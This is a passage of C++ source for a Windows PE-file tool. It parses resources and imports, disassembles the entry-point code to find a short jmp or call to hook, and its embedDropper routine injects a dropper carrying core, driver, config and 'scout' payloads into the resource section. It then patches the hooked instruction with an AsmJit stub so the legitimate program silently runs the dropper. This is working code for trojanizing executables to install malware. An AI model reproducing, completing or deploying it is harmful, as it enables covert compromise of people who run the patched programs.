		ResourceDirectoryEntry* cRDirE = strings.front();

		WCHAR* szName = cRDirE->GetName();
		WORD iLen = wcslen(szName);

		size += sizeof(WORD);
		size += iLen * sizeof(WCHAR);
		size += sizeof(WORD);

		strings.pop();
	}

	// RAW DATA
	while (!dataEntries2.empty()) {
		ResourceDataEntry* cRDataE = dataEntries2.front();
		DWORD increment = RALIGN(cRDataE->GetSize(), 8);
		size += increment;

		dataEntries2.pop();
	}

	return size;
}

void PEObject::_setResourceOffsets( ResourceDirectory* resDir, DWORD newResDirAt )
{
	for (int i = 0; i < resDir->CountEntries(); i++) {
		PIMAGE_RESOURCE_DIRECTORY_ENTRY dirEntry = PIMAGE_RESOURCE_DIRECTORY_ENTRY(resDir->GetEntry(i)->writtenAt);
		if (resDir->GetEntry(i)->IsDataDirectory()) {
			dirEntry->DataIsDirectory = 1;
			dirEntry->OffsetToDirectory = resDir->GetEntry(i)->GetSubDirectory()->writtenAt - newResDirAt;
			_setResourceOffsets(resDir->GetEntry(i)->GetSubDirectory(), newResDirAt);
		}
		else {
			ResourceDataEntry* dataEntry = resDir->GetEntry(i)->GetDataEntry();
			if (dataEntry)
				dirEntry->OffsetToData = dataEntry->writtenAt - newResDirAt;
		}
	}
}

bool PEObject::_parseIAT()
{
	DWORD rva = dataDirectory(IMAGE_DIRECTORY_ENTRY_IMPORT)->VirtualAddress;
	DWORD size = dataDirectory(IMAGE_DIRECTORY_ENTRY_IMPORT)->Size;
	
	if (!rva)
		return false;
	
	PIMAGE_IMPORT_DESCRIPTOR iat = (PIMAGE_IMPORT_DESCRIPTOR) atRVA(rva);
	while (iat->Name) {
		string dll = (PCHAR) atRVA(iat->Name);
		
		DWORD* thunk = (DWORD*) atRVA(iat->OriginalFirstThunk != 0 ? iat->OriginalFirstThunk : iat->FirstThunk);
		INT idx = 0;
		while (thunk[idx]) {
			DWORD rva = imageBase() + iat->FirstThunk + (idx * sizeof(DWORD));
			ostringstream call;
			
			if (thunk[idx] & IMAGE_ORDINAL_FLAG) 
			{
				call << dec << thunk[idx] - IMAGE_ORDINAL_FLAG;
				rva &= ~IMAGE_ORDINAL_FLAG;
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME) atRVA(thunk[idx]);
				call << (char*)name->Name;
			}
			
			IATEntry entry(dll, call.str(), idx);
			_iat.insert( make_pair( rva, entry ) );
			
			idx++;
		}
		
		iat++;
	}
	
	IATEntries::iterator iter = _iat.begin();
	for ( iter = _iat.begin(); iter != _iat.end(); iter++ )
	{
		DWORD addr = (*iter).first;
		IATEntry const & entry = getIATEntry(addr);	
		cout << "0x" << hex << addr << " " << IATEntry::str(entry) << " @" << entry.index() << endl;
	}
	
	return true;
}

IATEntry const & PEObject::getIATEntry( DWORD const rva )
{
	IATEntries::iterator entry = _iat.find(rva);
	if (entry != _iat.end())
		return (*entry).second;
	else
		throw IATEntryNotFound("No such entry.");
}

void PEObject::_findHookableInstruction()
{
	// reset stage1 hook information
	memset(&_hookPointer.stage1, 0, sizeof(_hookPointer.stage1));
	
	std::vector<disassembled_instruction>::iterator iter = instructions_.begin();
	for (; iter != instructions_.end(); iter++) 
	{
		// hook jmp opcodes of length 5
		disassembled_instruction instr = *iter;		
		switch (instr.d.Instruction.BranchType) {
			case JmpType:
				if (instr.len == STAGE1_STUB_SIZE) {
					printf("\n");
					printf("%.8X(%02d) %s\n",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
					printf("!!! valid hook found at VA %08x\n", instr.d.VirtualAddr);
					
					hookedInstruction_ = instr;
					_hookPointer.stage1.ptr = (char*) instr.d.EIP;
					_hookPointer.stage1.va = instr.d.VirtualAddr;
					_hookPointer.stage1.size = instr.len;
					
					return;
				}
				break;
			case CallType:
				if (instr.len == 6 || instr.len == STAGE1_STUB_SIZE) {
					printf("\n");
					printf("%.8X(%02d) %s\n", (int)instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
					printf("!!! potential hook found at VA %08x\n", instr.d.VirtualAddr);
					printf("!!! displacement %08x\n", instr.d.Argument2.Memory.Displacement);
					
					hookedInstruction_ = instr;
					_hookPointer.stage1.ptr = (char*) instr.d.EIP;
					_hookPointer.stage1.va = instr.d.VirtualAddr;
					_hookPointer.stage1.size = instr.len;

					return;

				}
				break;
		}
		
		(void) printf("%.8X(%02d) %s\n",(int) instr.d.VirtualAddr, instr.len, &instr.d.CompleteInstr);
	}
}

// XXX split disassemble and hooking
// XXX hooking method: call (length 5)
// XXX hooking method: call dword ptr (length 6)
void PEObject::_disassembleCode(unsigned char *start, unsigned char *end, int VA)
{
	disassembled_instruction instr;
	instr.d.EIP = (long long) start;
	instr.d.VirtualAddr = (long long) VA;
	instr.d.Archi = 0;
	instr.d.Options = MasmSyntax | NoTabulation | SuffixedNumeral | ShowSegmentRegs;
	
	instr.d.SecurityBlock = end - start;
	long long endVA = VA + ((long) end - (long) start);
	
	printf("starting disassembling from VA %08x\n", instr.d.VirtualAddr);
	
	while (instr.d.EIP < (long)end) {
		// disassemble current instruction
		printf("\rdisassembling %08x", instr.d.VirtualAddr);

		int len = Disasm(&instr.d);
		instr.len = len;

		if (len == OUT_OF_BLOCK || len == UNKNOWN_OPCODE)
			return;
		
		instructions_.push_back(instr);
		
		// go to next instruction
		instr.d.EIP = instr.d.EIP + len;
		instr.d.VirtualAddr = instr.d.VirtualAddr + len;	
	}
	
	printf("\n");
}

bool PEObject::_parseText()
{
	std::size_t decoded_size = 0x400;
	unsigned char* start = atRVA(epRVA());
	unsigned char* end = (unsigned char*) start + decoded_size;
	instructions_.reserve(decoded_size);
	
	_disassembleCode( start, end, epVA() );
	_findHookableInstruction();
	
	return true;
}

#define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
extern PBYTE TuneResources(PBYTE pRsrcBuffer, ULONG uSectionSize, ULONG uDropperSize, PULONG uNewSectionSize);

bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix, bf::path demoBitmap, BOOL isScout, bf::path scout)
{
	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
	GenericSection* epSection = findSection(OEP);
	
	// do not install stage2 pointer
	memset(&_hookPointer.stage2, 0, sizeof(_hookPointer.stage2));
	
	DropperObject dropper(*this);
	
	// check if we have a valid hook pointer
	if (_hookPointer.stage1.ptr == NULL)
		throw std::exception("No valid hook location found.");
	
	// save original code for restoring stage1
	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, _hookPointer.stage1.size);
	
	// FIXME: scout
	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir, fPrefix, demoBitmap, isScout) )
		throw std::exception("Dropper build failed.");
	
	// base size is original resource section
	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
	if (!targetSection)
		throw std::exception("Cannot find resource section.");

	ULONG uNewSectionSize;
	PBYTE pTunedBuffer = TuneResources((PBYTE)targetSection->data(), targetSection->size(), dropper.size(), &uNewSectionSize);

	targetSection->set_data((char *)pTunedBuffer, uNewSectionSize);
	
	// align size accounting for dropper size
	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
	if (fixManifest)
		sectionSize += _sizeOfResources();
	
	char* sectionData = NULL;
	try {
		sectionData = new char[ sectionSize ];
	} catch (...) {
		throw std::exception("Cannot allocate memory for new section.");
	}
	
	char* ptr = sectionData;
	cout << "ptr skew " << (ptr - sectionData) << " [size " << 0 << "]" << endl;
	
	memcpy(ptr, targetSection->data(), targetSection->SizeOfRawData());
	ptr += alignToDWORD(targetSection->SizeOfRawData());
	cout << "ptr skew " << (ptr - sectionData) << " [size " << targetSection->SizeOfRawData() << "]" << endl; 
	
	// calculate dropper offset in section
	DWORD dropperSkew = ptr - sectionData;
	
	DWORD epVA = 
		ntHeaders()->OptionalHeader.ImageBase 
		+ targetSection->VirtualAddress() 
		+ dropperSkew 
		+ dropper.epOffset();
	cout << "*** ENTRY POINT VA 0x" << hex << epVA << endl;
	
	// virtual address of the whole restore stub
	DWORD stubVA =
		ntHeaders()->OptionalHeader.ImageBase 
		+ targetSection->VirtualAddress() 
		+ dropperSkew 
		+ dropper.restoreStubOffset()
		;

	// virtual address of the restore stub entry point
	DWORD restoreVA = stubVA + sizeof(DWORD);
	
	cout << "*** RESTORE STUB located at VA 0x" << hex << stubVA << endl;
	cout << "*** RESTORE STUB entry point at VA 0x" << hex << restoreVA << endl;
	
	// copy dropper
	memcpy(ptr, dropper.data(), dropper.size());
	
	// prepare dropper call and restore stub
	AsmJit::Assembler restoreStub;
	
	restoreStub.data(&restoreVA, sizeof(DWORD));
	restoreStub.nop();
	restoreStub.pushfd(); // restoreVA starts here
	restoreStub.nop();
	restoreStub.pushad();
	restoreStub.nop();

	// save last_error
	restoreStub.nop();
	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
	restoreStub.nop();
	restoreStub.mov(AsmJit::eax, dword_ptr(AsmJit::eax, 0x34));
	restoreStub.nop();
	restoreStub.push(AsmJit::eax);
	restoreStub.nop();

	restoreStub.call( ( (DWORD)ptr + dropper.restoreStubOffset() ) + (epVA - stubVA) );

	// restore last_error
	restoreStub.nop();
	restoreStub.mov(AsmJit::eax, dword_ptr_abs(0, 0x18, AsmJit::SEGMENT_FS));
	restoreStub.nop();
	restoreStub.pop(AsmJit::ebx);
	restoreStub.nop();
	restoreStub.mov(dword_ptr(AsmJit::eax, 0x34), AsmJit::ebx);
	restoreStub.nop();
	restoreStub.popad();
	restoreStub.nop();

	// substract from retaddr before restoring flags
	restoreStub.sub( AsmJit::dword_ptr(AsmJit::esp, 4), hookedInstruction_.len );
	restoreStub.nop();
	restoreStub.popfd();
	restoreStub.nop();
	restoreStub.ret();
	
	// install restore and call stub
	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
	
	ptr += alignToDWORD(dropper.size());
	cout << "ptr skew " << (ptr - sectionData) << " [size " << dropper.size() << "]" << endl; 
	
	// write resources
	if (fixManifest) {
		try {
			_fixManifest();
		} catch (...) {
			throw std::exception("Cannot fix manifest");
		}
		DWORD skew = (DWORD)(ptr - sectionData);
		DWORD VA = targetSection->VirtualAddress() + ( (DWORD)ptr - (DWORD)sectionData );
		cout << "*** RESOURCE SECTION RVA " << hex << targetSection->VirtualAddress() << endl;
		cout << "*** RESOURCE SECTION SKEW " << hex << skew << endl;
		cout << "*** RESOURCE SECTION REWRITTEN @ " << hex << VA << endl;
		std::size_t size = _writeResources( ptr, VA );
		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->VirtualAddress = VA;
		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->Size = size;
		ptr += size;
		cout << "ptr skew " << (ptr - sectionData) << " [size " << size << "]" << endl;
	}
	
	// calculate total section size
	sectionSize = ptr - sectionData;
	cout << "Dropper size " << dec << dropper.size() << endl;
	
	// write to section
	cout << "Dropper section writing " << dec << sectionSize << " bytes of data [0x" << hex << (DWORD)sectionData << "] into new section." << endl;
	try {
		targetSection->SetData(sectionData, sectionSize);
	} catch (...) {
		throw std::exception("Cannot allocate memory for new section.");
	}
	// fix section permissions
	//targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
	
	// patch stubs code
	cout << "Stage1 jumping to " << hex << restoreVA << dec << std::endl;
	AsmJit::Assembler stage1stub;
	switch (hookedInstruction_.d.Instruction.BranchType) {
		case JmpType:
			{
				DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (restoreVA - hookedInstruction_.d.VirtualAddr);
				stage1stub.call( addr );
			}
			break;
		case CallType:
			{
				if(hookedInstruction_.len == 6)
				//DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr);
					stage1stub.call( AsmJit::dword_ptr_abs((void*)stubVA) );
				else if(hookedInstruction_.len == 5)
				{
					DWORD addr = ((DWORD) hookedInstruction_.d.EIP) + (stubVA - hookedInstruction_.d.VirtualAddr) + hookedInstruction_.len - 1 ;
					stage1stub.call(addr);
				}

			}
			break;
	}
	stage1stub.relocCode( (void*) _hookPointer.stage1.ptr );
	
	return true;
}

bool PEObject::_fixManifest()
{
	if (!_resources.dir)
		return false;
	
	// *** Get MANIFEST
	WCHAR* resType = MAKEINTRESOURCEW(24);
	int typeIdx = _resources.dir->Find(resType);
	if (typeIdx == -1) 
	{
		// we don't have a manifest entry, add everything
		Manifest* manifest = new Manifest();
		manifest->create();
		cout << endl << "MANGLED: " << endl << endl << manifest->toString() << endl;
		_updateResource(
			resType,
			(WORD)1, 
			(LANGID)0, 
			(PBYTE)manifest->toCharPtr(), 
			manifest->size());

		return true;
	}
	else
	{
		ResourceDirectory* nameDir = _resources.dir->GetEntry(typeIdx)->GetSubDirectory();
		int nameIdx = nameDir->Find(1);
		if (nameIdx <= -1)
			return false;
		
		ResourceDirectory* langDir = nameDir->GetEntry(nameIdx)->GetSubDirectory();
		int langIdx = langDir->Find((WORD)0);
		if (langDir->CountEntries() <= 0)
			return false;
		
		// get first entry, we do not care of language for manifest
		ResourceDataEntry* dataEntry = langDir->GetEntry(0)->GetDataEntry();
		if (!dataEntry)
			return false;
		
		PCHAR originalManifest = new CHAR[dataEntry->GetSize() + 1];
		memset(originalManifest, 0, dataEntry->GetSize() + 1);
		memcpy(originalManifest, dataEntry->GetData(), dataEntry->GetSize());
		
		cout << endl << "MANIFEST: " << endl << endl << originalManifest << endl;
		
		// MANIFEST MANGLING
		Manifest* manifest = new Manifest(string(originalManifest));
		manifest->check();
		manifest->serialize();
		
		cout << endl << "MANGLED: " << endl << endl << manifest->toString() << endl;
		
		dataEntry->SetAdded(true);
		dataEntry->SetData((PBYTE)manifest->toCharPtr(), manifest->size(), dataEntry->GetCodePage());
		
		delete [] originalManifest;

		return true;
	}

	return false;
}